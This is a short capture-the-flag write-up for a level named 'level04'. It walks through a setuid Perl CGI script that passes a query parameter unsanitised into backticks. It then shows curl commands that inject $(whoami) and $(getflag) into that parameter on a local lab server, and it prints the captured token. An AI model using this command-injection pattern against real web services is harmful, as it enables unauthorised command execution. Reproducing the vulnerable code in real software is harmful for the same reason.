## level04

1. Check files in current working directory (home dir)
    - `-rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl*`

Here we have a cool `perl` script, let's see what it does :

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

It's a CGI script, which means it's a script that can be executed by a web server, and it will return the output of the script to the client.

This script takes a parameter `x` and executes it using `echo`, and returns the output to the client.

In the same vein as the previous level, we have to escape the execution of `echo` and execute `getflag` instead.

Since there is a webserver running on port 4747 (`curl -v localhost:4747`), I assume that this perl script is the code of this server.

Passing `$PATH` to the parameter `x` (like this : `curl localhost:4747?x=$PATH`) returns `/usr/local/bin:/usr/bin:/bin`. Since the `$PATH`  was indeed evaluated, we can try to execute commands using the $(...) syntax.

And indeed doing an HTTP GET on `http://localhost:4747?x=$(whoami)` returns `flag04`, so we can do the same with `getflag` :

```bash
curl 'localhost:4747?x=$(getflag)'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```